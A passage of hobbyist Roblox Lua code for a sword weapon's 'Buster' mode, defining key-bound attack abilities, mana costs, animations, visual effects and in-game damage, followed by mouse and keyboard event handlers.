for i=1,20 do SpawnSword(FindGround(to.CFrame*cn(0,-2.75,-0.5+(-i*4)-i)),1+(i/10),15,"Pastel Blue",20,35) wait(0.07) end
BusterPose(0.08) fac=false a.c=true a.b="None"
 
elseif a.a=="Buster" and a.b=="None" and ekey and Button and a.c and mp>=75 then a.c=false a.b="Slash" mp=mp-75
c2(tw,0.125,3,0,0,0,0,35,0) c2(raw,0.125,3,1.25,0.85,0,-140,0,45) c1(hw,0.125,3,0,1.35,0,-15,35,0) w(0.1) Trail2(9,spi,0.03,ts(spi.BrickColor),0.1,cf(0,0.5,0)) rayHit(1,1,xBlade,ca(0,0,0),5,15,35) 
AddBV(  60,to.CFrame,to,0.2) c2(tw,0.175,3,0,0,0,0,-25,0) c2(hw,0.175,3,0,1.35,0,15,-25,0) c2(raw,0.175,3,1.25,0.85,-0.5,-40,0,45) c1(xhaw,0.175,3,0,-2,0,70,0,0) w(0.25/2)
BusterPose(0.08) a.c=true a.b="None"
 
elseif a.a=="Buster" and a.b=="None" and semi and Button and a.c and mp>=75 then a.c=false a.b="Slash" mp=mp-75
print("Testing")
 
elseif a.a=="Buster" and a.b=="None" and rkey and Button and a.c and mp>=45 then a.c=false a.b="Block" mp=mp-45 fac=true
hu.WalkSpeed=ns/3 c2(raw,0.125,3,1.35,1,0,-90,0,-90-15) c2(law,0.125,3,-1.5,0.5,0,-80,0,0) c1(xhaw,0.125,3,0,-2,0,0,90,0)  Block.Value=true
repeat w() mp=mp - 3 until mp < 3 or ky=="r" 
Block.Value=false hu.WalkSpeed=ns BusterPose(0.15) fac=false a.c=true a.b="None"
 
elseif a.a=="Buster" and a.b=="None" and zkey and Button and a.c and mp~=maxmp then a.c=false a.b="Enragen"
hu.WalkSpeed=0 c2(hw,0.1,3,0,1.5,0,-35,0,0) c2(raw,0.1,3,1.5,1,0,-210,0,-50) c2(law,0.1,3,-1.5,1,0,-210,0,50) c1(xhaw,0.1,3,0,-2,0,180,-50,0) wait(0.25)
c2(hw,0.15,3,0,1.5,0,0,0,0) c2(raw,0.15,3,1.5,0.5,-0.5,-90,-50,0) c1(law,0.15,3,-1.5,0.5,-0.5,-90,50,0) 
q(function() wait(0.25) MakeCrack(FindGround(to.CFrame*cn(0,-3,-2)*ca(0,rd(rn(-360,360)),0)).p,7,20,c) end)
q(function() repeat
GlowMesh(false,asset.."20329976",t,v3(4,1,4),"Black",t.CFrame*cn(0,-2.5,-2)*ca(0,rn(-360,360),0),0.2,1,0.05) 
GlowMesh(false,"block",t,v3(1,1,1),"Black",t.CFrame*cn(rn(-10,10),rn(2,10),rn(-10,10))*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.2,1,0.05) 
GlowMesh(false,"sphere",t,v3(1.5,10,1.5),"Black",t.CFrame*cn(rn(-10,10),-5,rn(-10,10)),0,1,0.08) 
w() until a.c end)
repeat w() addmp(5) until mp>=maxmp or ky=="z"
hu.WalkSpeed=ns BusterPose(0.1) a.c=true a.b="None"
 
elseif a.a=="Buster" and a.b=="None" and ckey and Button and a.c then a.c=false a.b="Sit" -- not quite fixed
hu.WalkSpeed=0 Legz(false) c2(tw,0.08,3,0,-1.5,0,-10,0,0) c2(llw,0.1,3,-0.5,-1,0,-80,-18,0) c2(rlw,0.1,3,0.5,-1,0,-80,18,0) c2(law,0.1,3,-1.3,1,0,15,0,15) c2(raw,0.1,3,1.3,1,0,-30,0,-20) 
c1(xhaw,0.06,3,0,-2,0,-45,0,-35)
repeat w() until ky=="c" BusterPose(0.07) a.c=true a.b="None" Legz(true) hu.WalkSpeed=ns
 
elseif a.a=="Buster" and a.b=="None" and tkey and Button and a.c and mp>=100 then a.c=false a.b="Spin Slash" mp=mp-100
c2(tw,100,3,0,0,0,0,360,0) c2(tw,0.1,3,0,0,0,0,60,0) c2(raw,0.1,3,1,0.5,0,-35,180,-90) c1(xhaw,0.1,3,0,-2,0,35,0,0) AddBV(  40,to.CFrame,to,0.2)
Trail2(9,spi,0.03,ts(spi.BrickColor),0.1,cf(0,0.5,0)) rayHit(1,3,xBlade,ca(0,0,0),5,25,40) c2(tw,0.15,3,0,0,0,0,-60,0) c2(xhaw,0.15,3,0,-2,0,50,0,0) c1(raw,0.15,3,1,0.5,0,100,180,-90) wait(0.5)
BusterPose(0.09) cleanweld(tw,"a1") a.c=true a.b="None"
 
elseif a.a=="Buster" and a.b=="None" and hkey and Button and a.c and mp>=2500 then a.c=false a.b="Substantial Rage: Irregular" mp=mp-2500 hu.WalkSpeed=0  hu.MaxHealth=1/0 hu.Health=1/0
q(function() for i=0.5,0,-0.05 do li.Brightness=i li.Ambient=c3(i+0.5,i+0.5,i+0.5) w() end end)
c2(raw,0.07,3,1,1,0,-55,60,0) c2(law,0.07,3,-1,1,0,-55,-60,0) c1(hw,0.07,3,0,1.5,-0.25,20,0,0)
for i=1,10 do GlowMesh(false,asset .. "1323306",t,v3(7,7,7),"Bright yellow",t.CFrame*cn(0,2.5,0),0.2,1,0.1) 
GlowMesh(false,asset .. "20329976",t,v3(8,5,8),"Bright yellow",t.CFrame*cn(0,-2,0),0.2,1,0.1) w(0.2) end
a.b="Substantial Rage: Vigorous"
for i=1,10 do GlowMesh(false,asset .. "1323306",t,v3(9,9,9),"Bright orange",t.CFrame*cn(0,3,0),0.2,1,0.1) 
GlowMesh(false,asset .. "20329976",t,v3(9,6,9),"Bright orange",t.CFrame*cn(0,-2,0),0.2,1,0.1) w(0.2) end
a.b="Substantial Rage: Godlike"
c2(raw,0.07,3,1,1,0,-140,60,0) c2(law,0.07,3,-1,1,0,-140,-60,0) c2(hw,0.07,3,0,1.5,0,-40,0,0)
for i=1,10 do GlowMesh(false,asset .. "1323306",t,v3(11,11,11),"Bright red",t.CFrame*cn(0,4,0),0.2,1,0.1) 
GlowMesh(false,asset .. "20329976",t,v3(10,7,10),"Bright red",t.CFrame*cn(0,-2,0),0.2,1,0.1) w(0.2) end Legz(false)
c2(raw,0.04,3,1,0.5,-0.25,-75,-35,0) c2(law,0.04,3,-1,0.5,-0.25,-75,35,0) c1(hw,0.04,3,0,1.5,0,10,0,0) w(0.25)
c2(raw,0.06,3,1,0.5,-0.25,-130,-35,0) c2(law,0.06,3,-1,0.5,-0.25,-120,50,0) c2(hw,0.06,3,0,1.5,0,-30,0,0) c2(tw,0.08,3,0,7,1,-20,0,0) c2(llw,0.06,3,-0.5,-1,0,30,0,18) c1(rlw,0.06,3,0.5,-1,0,30,0,-18)
w(0.5) c2(tw,0.05,3,0,-1,0,0,0,0) c2(hw,0.05,3,0,1.5,0,15,0,0) c2(raw,0.07,3,1,0.5,-0.25,-35,-35,0) c2(law,0.07,3,-1,0.5,-0.25,-25,35,0) c2(llw,0.07,3,-0.5,-1,0,80,0,9) c2(rlw,0.07,3,0.5,-0.5,-0.5,10,0,0)
c1(xhaw,0.05,3,0,-2,0,50,-17.5,-40)
q(function() for i=1,30 do GlowMesh(false,asset .. "20329976",t,v3(50,30,50),"Black",t.CFrame*cn(0,5,-2)*ca(0,rd(rn(-360,360)),0),0.2,1,0.05)
GlowMesh(false,asset .. "1323306",t,v3(50,40,50),"Black",t.CFrame*cn(0,15,0)*ca(0,rd(rn(-360,360)),0),0.2,1,0.05)
if i%5==0 then GlowMesh(false,asset .. "3270017",t,v3(100,100,50),"Black",t.CFrame*cn(0,0,0)*ca(rd(90),0,0),0.1,1,0.05) end
GlowMesh(false,"sphere",t,v3(50,50,50),"Black",t.CFrame*cn(0,2,0),0,1,0.05)
GlowMesh(false,"block",t,v3(10,10,10),"Black",t.CFrame*cn(rn(-75,75),rn(15,100),rn(-75,75))*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0,1,0.05)
w(0.05) end end)
SplashDmg(false,to.Position,rn(0,1),125,50)
wait(5) 
q(function() for i=0,0.5,0.05 do li.Brightness=i li.Ambient=c3(i+0.5,i+0.5,i+0.5) w() end end)
BusterPose(0.08) a.b="None" a.c=true hu.WalkSpeed=ns hu.MaxHealth=nh Legz(true)
 
 
elseif a.a=="Buster" and a.b=="None" and ykey and Button and a.c and mp>=175 then a.c=false a.b="Forward Slash" mp=mp-175
c2(raw,0.1,3,1.25,1,0.25,-210,0,-40) c2(law,0.1,3,-1.25,1,0.25,-195,0,45) c2(hw,0.1,3,0,1.5,0.25,-35,0,0) c1(xhaw,0.1,3,-0.2,-2,-0.1,-20,0,0) w(0.15)
Trail2(9,xBlade,0.05,"Pastel Blue",0.1,cf(0,-2,-0.5)) rayHit(1,2,xBlade,ca(0,0,0),5,25,40)
BusterPose(0.08) a.c=true a.b="None"
 
elseif a.a=="Buster" and a.b=="None" and ukey and Button and a.c and mp>=200 then a.c=false a.b="Buster Charge" mp=mp-200 fac=true q(function() while a.b=="Buster Charge" do wait() hu.PlatformStand=false end end)
c2(raw,0.07,3,1.35,1,0,-90,0,-90-15) c2(law,0.07,3,-1.5,0.5,0,-80,0,0) c1(xhaw,0.07,3,0,-2,0,0,90,0)
local bpp = qi({"BodyVelocity",he,maxForce=v3(1/0,1/0,1/0)}) rr=3 antidmg=0
q(function() while bpp.Parent~=nil do w() antidmg=antidmg+1
GetRegion(xBlade.Position-v3(rr,rr,rr),xBlade.Position+v3(rr,rr,rr),function(v) 
if antidmg%10==0 then v.Humanoid.PlatformStand = true 
Dmgz(false,v.Humanoid,rn(30,40),v.Torso) q(function() wait(0.5) v.Humanoid.PlatformStand = false end) end
end)
DashEf(bladep.CFrame*ca(rd(90),0,rd(90)),"Black") 
Magic(to,3,3,3,0,0,0,"Black")
GlowMesh(false,"block",t,v3(1,1,1),"Black",t.CFrame*cn(rn(-10,10),rn(0,10),rn(-10,10))*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.3,1,0.1)
bpp.velocity=he.CFrame.lookVector * 70 
end end) w(1)
bpp.Parent=nil 
BusterPose(0.08)
a.c=true a.b="None" fac=false
 
elseif a.a=="Buster" and a.b=="None" and gkey and Button and a.c and mp>50 then a.c=false a.b="Imbued Lightning" mp=mp-50 fac=true antidmg=0
c2(tw,0.06,3,0,0,0,0,80,0) c2(hw,0.06,3,0,1.5,0,0,-80,0) c1(law,0.06,3,-1,0.5,0,0,0,90)
repeat w() antidmg=antidmg+1 mp=mp-5 c2(hw,1.25,3,0,1.5,0,math.deg((to.Position-mouse.hit.p).unit.y),-80,0) c2(law,1.25,3,-1,0.5,0,0,0,90-math.deg((to.Position - mouse.hit.p).unit.y))
GlowMesh(true,asset .. "20329976",t,v3(5,3.5,5),"Black",cn(0,-2.5,0)*ca(0,rn(-360,360),0),0.3,1,0.1)
GlowMesh(false,"block",t,v3(3,3,3),"Black",la.CFrame*cn(0,-3,0)*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.3,1,0.1)
if antidmg%5==0 then GlowMesh(false,"sphere",t,v3(1.5,1.5,1.5),"Pastel Blue",la.CFrame*cn(0,-3,0),0.3,1,0.1) end
GlowMesh(false,"block",t,v3(10,10,10),"Pastel Blue",mouse.Hit*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.3,1,0.05)
if (to.Position - mouse.Hit.p).magnitude < 2500 then Lightning(la.Position,mouse.Hit.p,5,1,"Pastel Blue",0.3,0) if antidmg%5==0 then SplashDmg(false,mouse.Hit.p,rn(25,35),7.5,50) end end
until ky=="g" or mp<=10
BusterPose(0.08) a.b="None" a.c=true fac=false
 
elseif a.a=="Buster" and a.b=="None" and fkey and Button and a.c and mp>=150 then a.c=false a.b="Rapid Slash" mp=mp-50
repeat w() mp=mp-100 -- slash 1
c2(xhaw,0.1,3,0,-2,0,0,0,0) c2(tw,0.125,3,0,0,0,0,35,0) c2(raw,0.125,3,1.25,0.85,0,-140,0,45) c1(hw,0.125,3,0,1.35,0,-15,35,0) w(0.1) Trail2(9,spi,0.03,ts(spi.BrickColor),0.1,cf(0,0.5,0)) rayHit(1,1,xBlade,ca(0,0,0),5,15,35) 
AddBV(  60,to.CFrame,to,0.2) c2(tw,0.175,3,0,0,0,0,-25,0) c2(hw,0.175,3,0,1.35,0,15,-25,0) c2(raw,0.175,3,1.25,0.85,-0.5,-40,0,45) c1(xhaw,0.175,3,0,-2,0,70,0,0) 
w() -- slash 2
c2(xhaw,0.1,3,0,-2,0,0,0,0) c2(hw,0.1,3,0,1.5,0,0,-45,0) c1(raw,0.09,3,1.25,0.9,0,-130,0,-90) Trail2(9,spi,0.03,ts(spi.BrickColor),0.1,cf(0,0.5,0)) rayHit(1,3,xBlade,ca(0,0,0),3,10,30)
AddBV(  60,to.CFrame,to,0.2) c2(xhaw,0.1,3,0,-2,0,70,0,0) c2(hw,0.1,3,0,1.5,0,0,35,0) c1(raw,0.1,3,1.25,0.9,0,0,0,-90) 
until ky=="f" or mp<=100
BusterPose(0.08) a.b="None" a.c=true fac=false
 
elseif a.a=="Buster" and a.b=="None" and jkey and Button and a.c and mp>=500 then a.c=false a.b="Explosive Matter" mp=mp-100  hu.MaxHealth=1/0 hu.Health=1/0
q(function() for i=0.5,0,-0.05 do li.Brightness=i li.Ambient=c3(i+0.5,i+0.5,i+0.5) w() end end) hu.WalkSpeed=0
c2(raw,0.08,3,1.25,1,0,18,0,-18) c2(law,0.08,3,-1.25,1,0,18,0,18) c1(hw,0.08,3,0,1.5,0,18,0,0)
q(function() for i=1,25 do GlowMesh(false,"block",t,v3(2,2,2),"Black",la.CFrame*cn(0,-2,0)*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.2,1,0.1) wait(0) end 
GlowMesh(false,"sphere",t,v3(3,3,3),"Black",la.CFrame*cn(0,-2.5,0),0.2,1,0.05) 
end)
c2(hw,0.1,3,0,1.5,0,0,80,0) c2(tw,0.1,3,0,0,0,0,-80,0) c1(law,0.1,3,-1,0.5,0,0,0,80) w(0.1) c2(hw,0.125,3,0,1.5,0,0,-50,0) c2(tw,0.125,3,0,0,0,0,50,0) c1(law,0.125,3,-1,0.5,0,-40,0,80)
local rhit,aihu=rayHit2(la,ca(rd(-90),0,0),6) if rhit and aihu and aihu.Parent:findFirstChild("Torso") then mp=mp-400 hu.WalkSpeed=0 aihu.PlatformStand=true local vto=aihu.Parent.Torso Dmgz(false,aihu,rn(18,25),vto)
c2(tw,0.125,3,0,0,0,0,0,0) c2(raw,0.08,3,1.25,1,0,18,0,-18) c2(law,0.08,3,-1.25,1,0,18,0,18) c1(hw,0.08,3,0,1.5,0,18,0,0)
local aibp=it("BodyPosition",vto) aibp.maxForce=v3(1/0,1/0,1/0) aibp.P=10000 aibp.position=to.CFrame*cf(0,0,-25).p vto.CFrame=cn(vto.Position,to.Position)
local aibav=qi({"BodyAngularVelocity",vto,angularvelocity=v3(rn(-3,3),rn(-3,3),rn(-3,3))})
q(function() while a.b=="Explosive Matter" do GlowMesh(false,"block",vto,v3(4,4,4),"Black",vto.CFrame*cn(0,0,0)*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.2,1,0.1) w() end end)
for i=1,10 do GlowMesh(false,asset .. "1323306",t,v3(10,10,10),"Black",t.CFrame*cn(0,4,0),0.2,1,0.1) GlowMesh(false,asset .. "20329976",t,v3(10,7,10),"Black",t.CFrame*cn(0,-2,0),0.2,1,0.1) w(0.2) end
BusterPose(0.1) c2(tw,0.1,3,0,0,0,0,80,0) c2(hw,0.1,3,0,1.5,0,0,-80,0) c1(law,0.1,3,-1,0.5,0,0,0,140)
MatterBall(to.CFrame*cn(0,0,-5),3,0.7,30,1)
w(3) de(aibav,0) de(aibp,0) aihu.PlatformStand=false
else w(0.8) end
q(function() for i=0,0.5,0.05 do li.Brightness=i li.Ambient=c3(i+0.5,i+0.5,i+0.5) w() end end)
BusterPose(0.1) a.b="None" a.c=true hu.WalkSpeed=ns hu.MaxHealth=nh
elseif mp>=50 and vkey and a.a=="Buster" and a.b=="None" and a.c and Button then a.b="Hoverboard" a.c=false mp=mp-50 Legz(false)
bcol1="Really black"
bg=qi({"BodyGyro",he,maxTorque=v3(1/0,1/0,1/0)}) bp=qi({"BodyPosition",to,maxForce=v3(1/0,1/0,1/0),position=to.Position})
b1=pa(xmod,"Board","Block",2,0.5,5,false,false,0,0,bcol1) weld(b1,to,b1,0,-3,0,0,0,0) qi({"BlockMesh",b1}) b1.CanCollide=false
b2=pa(xmod,"Board","Block",2,0.5,2,false,false,0,0,bcol1) weld(b2,b1,b2,0,0,2.5,0,0,0) qi({"CylinderMesh",b2}) b2.CanCollide=false
b3=pa(xmod,"Board","Block",2,0.5,2,false,false,0,0,bcol1) weld(b3,b1,b3,0,0,-2.5,0,0,0) qi({"CylinderMesh",b3}) b3.CanCollide=false
b4=pa(xmod,"Board","Block",0.5,1,0.5,false,false,0,0,bcol1) weld(b4,b1,b4,-1.5,0,1.75,rd(90),0,rd(90)) qi({"CylinderMesh",b4}) b4.CanCollide=false
b5=pa(xmod,"Board","Block",0.5,1,0.5,false,false,0,0,bcol1) weld(b5,b1,b5,-2.25,0,2,rd(90),0,rd(45)) qi({"CylinderMesh",b5}) b5.CanCollide=false
b6=pa(xmod,"Board","Block",0.5,1,0.5,false,false,0,0,bcol1) weld(b6,b1,b6,1.5,0,1.75,rd(90),0,rd(-90)) qi({"CylinderMesh",b6}) b6.CanCollide=false
b7=pa(xmod,"Board","Block",0.5,1,0.5,false,false,0,0,bcol1) weld(b7,b1,b7,2.25,0,2,rd(90),0,rd(-45)) qi({"CylinderMesh",b7}) b7.CanCollide=false
ca0=pa(xmod,"Board","Block",1,1.5,1,false,false,0,0,bcol1) weld(ca0,b1,ca0,0,-0.65,-2,rd(-130),0,0) qi({"CylinderMesh",ca0}) ca0.CanCollide=false
ca1=pa(xmod,"Board","Block",1,1.5,1,false,false,0,0,bcol1) weld(ca1,b1,ca1,0,-1,-3,rd(90),0,0) qi({"CylinderMesh",ca1}) ca1.CanCollide=false
ca2=pa(xmod,"Board","Block",0.75,0.01,0.75,false,false,0,0,"Really black") weld(ca2,ca1,ca2,0,-0.75,0,0,0,0) qi({"CylinderMesh",ca2,Scale=v3(1,0.25,1)}) ca2.CanCollide=false
for i,v in pairs(xmod:GetChildren()) do if v.Name=="Board" then q(function() for i=1,-1,-0.05 do v.Transparency=i w() end end) end end
c2(tw,0.07,3,0,0,0,0,90,0) c2(hw,0.07,3,0,1.5,0,0,-90,0) c2(raw,0.07,3,1.25,1,0,-18,0,-18) c2(law,0.07,3,-1,0.5,0,0,0,85) c2(rlw,0.07,3,0.5,-1,0,-13,0,-18) c2(llw,0.07,3,-0.5,-1,0,-13,0,18)
repeat w() if tb.userId==accz[1] then mp=mp-0 else mp=mp-5 end
q(function() Trail2(1,b5,0.03,"Pastel Blue",0.1,cf(-0.25,0.75,0)) end) 
q(function() Trail2(1,b7,0.03,"Pastel Blue",0.1,cf(0.25,0.75,0)) end)
bg.cframe=cn(to.Position,mouse.Hit.p) bp.position=(to.CFrame*cn(0,0,-3+(-2.5))).p
until ky=="v" or mp<=5
for i,v in pairs(xmod:GetChildren()) do if v.Name=="Board" then q(function() for i=0,1.5,0.1 do v.Transparency=i w() end v:Remove() end) end end de(bp,0) de(bg,0)
BusterPose(0.1) Legz(true) a.b="None" a.c=true hu.WalkSpeed=ns hu.MaxHealth=nh
elseif mp>=50 and fkey and a.a=="Buster" and a.b=="Hoverboard" and Button then if tb.userId==accz[1] then mp=mp-0 else mp=mp-50 end gunshot(10,3,rn(10,20),ca1.CFrame*ca(0,0,rd(180)))
 
elseif mp>=600 and bkey and a.a=="Buster" and a.b=="None" and a.c and Button then hu.MaxHealth=1/0 hu.Health=1/0 a.b="Slice 'N' Dice" mp=mp-100
q(function() for i=0.5,0,-0.05 do li.Brightness=i li.Ambient=c3(i+0.5,i+0.5,i+0.5) w() end end) hu.WalkSpeed=0
c2(raw,0.08,3,1.25,1,0,18,0,-18) c2(law,0.08,3,-1.25,1,0,18,0,18) c1(hw,0.08,3,0,1.5,0,18,0,0)
q(function() for i=1,25 do GlowMesh(false,"block",t,v3(2,2,2),"Black",la.CFrame*cn(0,-2,0)*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.2,1,0.1) wait(0) end GlowMesh(false,"sphere",t,v3(3,3,3),"Black",la.CFrame*cn(0,-2.5,0),0.2,1,0.05) end)
c2(hw,0.1,3,0,1.5,0,0,80,0) c2(tw,0.1,3,0,0,0,0,-80,0) c1(law,0.1,3,-1,0.5,0,0,0,80) w(0.1) c2(hw,0.125,3,0,1.5,0,0,-50,0) c2(tw,0.125,3,0,0,0,0,50,0) c1(law,0.125,3,-1,0.5,0,-40,0,80)
local rhit,aihu=rayHit2(la,ca(rd(-90),0,0),6) if rhit and aihu and aihu.Parent:findFirstChild("Torso") then mp=mp-500 hu.WalkSpeed=0 aihu.PlatformStand=true local vto=aihu.Parent.Torso Dmgz(false,aihu,rn(18,25),vto)
local aibp=it("BodyPosition",vto) aibp.maxForce=v3(1/0,1/0,1/0) aibp.P=10000 aibp.position=to.CFrame*cf(0,0,-25).p vto.CFrame=cn(vto.Position,to.Position)
local aibav=qi({"BodyAngularVelocity",vto,angularvelocity=v3(rn(-3,3),rn(-3,3),rn(-3,3))})
q(function() while a.b=="Slice 'N' Dice" do GlowMesh(false,"block",vto,v3(4,4,4),"Black",vto.CFrame*cn(0,0,0)*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.2,1,0.1) w() end end) w(1) Legz(false) 
c2(raw,0.08,3,1,0.5,-0.25,-75,-35,0) c2(law,0.08,3,-1,0.5,-0.25,-75,35,0) c1(hw,0.08,3,0,1.5,0,10,0,0) w(0.25)
c2(raw,0.1,3,1,0.5,-0.25,-130,-35,0) c2(law,0.1,3,-1,0.5,-0.25,-120,50,0) c2(hw,0.1,3,0,1.5,0,-30,0,0) c2(tw,0.08,3,0,4,1,-20,360,0) c2(llw,0.1,3,-0.5,-1,0,30,0,18) c1(rlw,0.1,3,0.5,-1,0,30,0,-18) w(0.2) c2(tw,0.11,3,0,-1,0,0,360,0)
c2(hw,0.11,3,0,1.5,0,15,0,0) c2(raw,0.11,3,1,0.5,-0.25,-35,-35,0) c2(law,0.11,3,-1,0.5,-0.25,-25,35,0) c2(llw,0.11,3,-0.5,-1,0,80,0,9) c2(rlw,0.11,3,0.5,-0.5,-0.5,10,0,0)
c1(xhaw,0.11,3,0,-2,0,50,-17.5,-40) GlowMesh(true,asset .. "20329976",to,v3(3,2,3),"Black",cn(0,-2.5,-6),0.1,1,0.05) 
for i=1,3 do SpawnSword(FindGround(to.CFrame*cn(0,-2.75,-0.5+(-i*8)-i)),1+(i/10),15,"Black",25,40) wait(0.25) end 
w(3) de(aibav,0) de(aibp,0) aihu.PlatformStand=false cleanweld(tw,"a1")
else w(0.8) end
q(function() for i=0,0.5,0.05 do li.Brightness=i li.Ambient=c3(i+0.5,i+0.5,i+0.5) w() end end)
BusterPose(0.1) a.b="None" a.c=true hu.WalkSpeed=ns hu.MaxHealth=nh Legz(true)
 
elseif mp>=750 and kkey and a.a=="Buster" and a.b=="None" and a.c and Button then a.b="Shockwave" mp=mp-750
hu.WalkSpeed=0 Legz(false)
c2(raw,0.08,3,1,0.5,-0.25,-75,-35,0) c2(law,0.08,3,-1,0.5,-0.25,-75,35,0) c1(hw,0.08,3,0,1.5,0,10,0,0) w(0.25)
c2(raw,0.1,3,1,0.5,-0.25,-130,-35,0) c2(law,0.1,3,-1,0.5,-0.25,-120,50,0) c2(hw,0.1,3,0,1.5,0,-30,0,0) c2(tw,0.04,3,0,6,1,-20,360,0) c2(llw,0.1,3,-0.5,-1,0,30,0,18) c1(rlw,0.1,3,0.5,-1,0,30,0,-18) w(1) c2(tw,0.11,3,0,-1,0,0,360,0)
c2(hw,0.11,3,0,1.5,0,15,0,0) c2(raw,0.11,3,1,0.5,-0.25,-35,-35,0) c2(law,0.11,3,-1,0.5,-0.25,-25,35,0) c2(llw,0.11,3,-0.5,-1,0,80,0,9) c2(rlw,0.11,3,0.5,-0.5,-0.5,10,0,0)
c1(xhaw,0.11,3,0,-2,0,50,-17.5,-40) GlowMesh(true,asset .. "20329976",to,v3(5,3,5),"Black",cn(0,-2,-6),0,1,0.03) cleanweld(tw,"a1")
q(function() for i=1,30 do 
GlowMesh(false,asset .. "20329976",t,v3(15,6,15),"Black",t.CFrame*cn(0,-1,-6)*ca(0,rd(rn(-360,360)),0),0.2,1,0.05)
if i%5==0 then GlowMesh(false,"sphere",t,v3(20,20,20),"Black",t.CFrame*cn(0,-1,-6),0.2,1,0.05) GlowMesh(false,asset .. "3270017",t,v3(50,50,20),"Black",t.CFrame*cn(0,0,-6)*ca(rd(90),0,0),0.1,1,0.05) end
GlowMesh(false,"block",t,v3(2,2,2),"Black",t.CFrame*cn(0,0,-6)*cn(rn(-20,20),rn(2,20),rn(-20,20))*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0,1,0.05)
w(0.05) end end)
SplashDmg(false,to.Position,rn(40,80),20,50)
local rr = 20 GetRegion(to.CFrame*cn(0,0,-6).p-v3(rr,rr,rr),to.CFrame*cn(0,0,-6).p+v3(rr,rr,rr),function(v) if v.Name~=tb.Name then local bpp = qi({"BodyVelocity",v.Torso,maxForce=v3(1/0,1/0,1/0),velocity=cn(t.CFrame*cn(0,0,-6).p,v.Torso.Position).lookVector*120}) wait(0.15) bpp:Remove() end end)
w(3) BusterPose(0.1) a.b="None" a.c=true hu.WalkSpeed=ns Legz(true)
 
elseif mp>=100 and nkey and a.a=="Buster" and a.b=="None" and a.c and Button then a.b="Defy Gravity" a.c=false mp=mp-100 fac=true hu.WalkSpeed=ns/2
c2(tw,0.1,3,0,0,0,0,-90,0) c2(hw,0.1,3,0,1.5,0,0,90,0) c2(raw,0.1,3,1,0.5,0,0,0,-90) c1(xhaw,0.1,3,0,-3.5,0,90,0,0)
repeat mp=mp-2 c2(raw,1.25,3,1,0.5,0,0,0,-90+math.deg((to.Position - mouse.hit.p).unit.y)) c2(hw,1.25,3,0,1.5,0,math.deg((to.Position - mouse.hit.p).unit.y),90,0)
SplashGrav(mouse.Hit.p,15) w()
until ky=="n" or mp<=2
fac=false BusterPose(0.09) a.c=true a.b="None" hu.WalkSpeed=ns
 
elseif mp>=500 and a.Critical[1]==20 and mkey and a.a=="Buster" and a.b=="None" and a.c and Button then a.b="Frenzy" mp=mp-500 hu.WalkSpeed=0
hu.Jump=true 
GlowMesh(false,asset .. "20329976",t,v3(5,2,5),"Pastel Blue",FindGround(t.CFrame)*cn(0,1,0),0,1,0.1)
GlowMesh(false,asset .. "3270017",t,v3(10,10,4),"Pastel Blue",FindGround(t.CFrame)*ca(rd(90),0,0),0,1,0.08)
c2(raw,0.14,3,1,0.5,-0.25,-90,-35,0) c2(law,0.14,3,-1,0.5,-0.25,-90,35,0) c1(hw,0.14,3,0,1.5,0,10,0,0)
local hdp=pa(xmod,"","Block",1,1,1,false,false,0,0,"Pastel Blue") weld(hdp,xBlade,hdp,0,0,0,0,0,0) hdpm=qi({"SpecialMesh",hdp,MeshType="Sphere",Scale=v3(1,4.5,2)}) 
for i=0,1,0.08 do hdpm.Scale=v3(i*1,i*5,i*2) hdp.Transparency=i w() end de(hdp,0) for i,v in pairs(xmod:GetChildren()) do if v.Name=="e" then v.BrickColor=bc("Pastel Blue") end end
a.Critical={1,1.5} q(function() w(11) a.Critical={20,3} 
local hdp=pa(xmod,"","Block",1,1,1,false,false,0,0,"Pastel Blue") weld(hdp,xBlade,hdp,0,0,0,0,0,0) hdpm=qi({"SpecialMesh",hdp,MeshType="Sphere",Scale=v3(1,4.5,2)}) 
for i=0,1,0.08 do hdpm.Scale=v3(i*1,i*5,i*2) hdp.Transparency=i w() end de(hdp,0) for i,v in pairs(xmod:GetChildren()) do if v.Name=="e" then v.BrickColor=bc("Medium grey") end end 
end) w(1)
BusterPose(0.125) a.b="None" hu.WalkSpeed=ns
 
 
end -- if end
end) -- func end
 
mouse.Button1Up:connect(function() Button = false end)
 
mouse.Button2Down:connect(function() Button2=true end)
 
mouse.Button2Up:connect(function() Button2=false end)
 
mouse.KeyDown:connect(function(k2) local k=k2:lower() Key2=true
ky = ""
if k2=="q" then qkey=true end 
if k2=="e" then ekey=true end 
if k2=="r" then rkey=true end 
if k2=="t" then tkey=true end 
if k2=="y" then ykey=true end 
if k2=="u" then ukey=true end 
if k2=="p" then pkey=true end 
if k2=="f" then fkey=true end 
if k2=="g" then gkey=true end 
if k2=="h" then hkey=true end 
if k2=="j" then jkey=true end 
if k2=="k" then kkey=true end 
if k2=="l" then lkey=true end 
if k2==";" then semi=true end 
if k2=="z" then zkey=true end 
if k2=="x" then xkey=true end 
if k2=="c" then ckey=true end 
if k2=="v" then vkey=true end 
if k2=="b" then bkey=true end 
if k2=="n" then nkey=true end 
if k2=="m" then mkey=true end 
if a.a == "None" then
a.Act(k,true)
else 
a.Act(k,false)
end -- a ab end 
end)
 
mouse.KeyUp:connect(function(k2)
if k2=="q" then qkey=false end 
if k2=="e" then ekey=false end 
if k2=="r" then rkey=false end 
if k2=="t" then tkey=false end 
if k2=="y" then ykey=false end 
if k2=="u" then ukey=false end 
if k2=="p" then pkey=false end 
if k2=="f" then fkey=false end 
if k2=="g" then gkey=false end 
if k2=="h" then hkey=false end 
if k2=="j" then jkey=false end 
if k2=="k" then kkey=false end 
if k2=="l" then lkey=false end 
if k2==";" then semi=false end 
if k2=="z" then zkey=false end
if k2=="c" then ckey=false end 
if k2=="v" then vkey=false end 
if k2=="b" then bkey=false end
if k2=="m" then mkey=false end
pcall(function()
ky=k2:lower()
end)
Key2 = false end)
end)
 
bin.Deselected:connect(function(mouse) 
Button=false 
fac=false 
if a.a=="Buster" and a.b=="None" and a.c then a.c=false
Armz(false) c1(raw,0.1,3,1.5,0.25,0,-220,25,0)
a.a="None" a.b="None" a.c=true
end
end)
 
